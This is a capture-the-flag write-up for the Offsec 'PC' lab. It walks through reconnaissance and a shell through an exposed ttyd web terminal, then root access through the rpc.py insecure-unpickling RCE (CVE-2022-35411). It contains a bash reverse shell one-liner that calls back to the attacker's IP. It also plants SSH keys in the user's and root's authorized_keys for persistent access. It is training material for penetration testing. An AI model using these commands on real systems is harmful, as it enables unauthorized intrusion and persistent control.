PC (Offsec)

Target IP: 192.168.238.210
Challenge Description: Part of the CTF-200 challenges.

Reconnaissance

Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.238.210 -p 22,8000 returns the output shown above. The application on the higher port seems to be running by the name ttyd/1.7.3-a2312cb. Time to check them.

Enumeration & Exploitation

Port 8000: HTTP

The application on port 8000 seems to be running the application shown in the image above. It is a terminal based application over the Internet, as can be found here. I performed a basic enumeration, and I found a few things.


Doing a search for ttyd using the command whereis ttyd returns the result /snap/bin/ttyd, as shown in the image above. Running this binary using the command /snap/bin/ttyd returns the application version is 1.7.3-a2312cb. Doing a Google search for vulnerabilities did not result in anything useful.


I started a listener on my machine at port 8443. Using the online terminal application, I deployed the bash reverse shell using the command /bin/bash -i >& /dev/tcp/192.168.45.206/8443 0>&1. And instantly, I obtained a reverse shell connection with the session as user on my machine. When performing enumeration, I found this shell to be quite slow and unresponsive. Since SSH is already open on port 22, I will use this to my advantage.


Using the command ssh-keygen on my machine, I created a new SSH keypair with the name as user. Then using the reverse shell session, I created the .ssh directory and authorized_keys. Inside this file, I replaced it with my new SSH key I created using the command echo 'ssh-ed25519... kali@kali' > authorized_keys. Then I changed the permission of the key to 400 using the commandchmod 400 user.


And then using the command ssh user@192.168.238.210 -i user, I gained a reliable foothold on the target machine as the user user as shown in the image above. Now I have perform privilege escalation.

SSH Local Port Forwarding & Further Enumeration: rpc.py


I ran the command ps -auxw | grep root and obtained the interesting output shown in the image above. The python3 /opt/rpc.py seems interesting to me, as it is being run as root. This is an RPC framework based on ASGI/WSGI. Time to check out the code.


I checked out the source-code on the target machine using the command cat /opt/rpc.py. I also checked the source-code of the RPC framework rpc.py over at pypi and this was the same code. It looks like it is running the same application. What application version is it? In the source code above, the application seems to be running on port 65432 by default. Let's check it out.


Running the command netstat -anto shows the output shown in the image above. And bingo. The application is operating under the same default port. However, this is only exposed internally and not outside to the public network. Since I have SSH access now, I can expose this outside to my attack machine for further enumeration. This is the only interesting port I identified; therefore, local port forwarding should be enough.


To setup the local port forwarding, I ran the command ssh user@192.168.238.210 -i user -L 65432:localhost:65432 -N as shown in the image above. This exposes the application on port 65432 on the target machine to my attack machine at port 65432 too. Then I can scan the port to identify more information.

I performed an aggressive scan using the command sudo nmap -sV -A localhost -p 65432 and obtained the output shown above. The same uvicorn server is being run on the backend.

Privilege Escalation

Vertical Privilege Escalation: User user to root via rpc.py RCE (CVE-2022–35411)


Doing a Google search for rpc.py vulnerabilities, I came across the website shown above. Due to insecure unpickling, it is vulnerable to remote code execution. This technical article dives deep into how and why it works. The code for this exploit is accessible from here.


Since command execution is available using the exploit, I can just use the attack vector to replace the SSH key of the user root with mine to obtain a root shell access on the target machine. I generated a SSH keypair using the command ssh-keygen on my machine first. The filename I saved it as root. Inside the exploit, I replaced the default command with echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+abOqtnoN3ax6oDMLrw8RyxjE8cKj76ha6wxj7DOCd kali@kali" > /root/.ssh/authorized_keys as shown in the image above. With the exploit ready to go now, time to run it.


To run the exploit successfully, I issued the command python3 exp.py as shown in the image above in the top terminal. On the bottom terminal in the picture above, I changed the permission of the SSH key to 400 to make it private. And then using the command ssh root@192.168.238.210 -i root , I opened a root shell on the target machine :)


There is only one flag for this challenge: proof.txt, as shown in the image above.
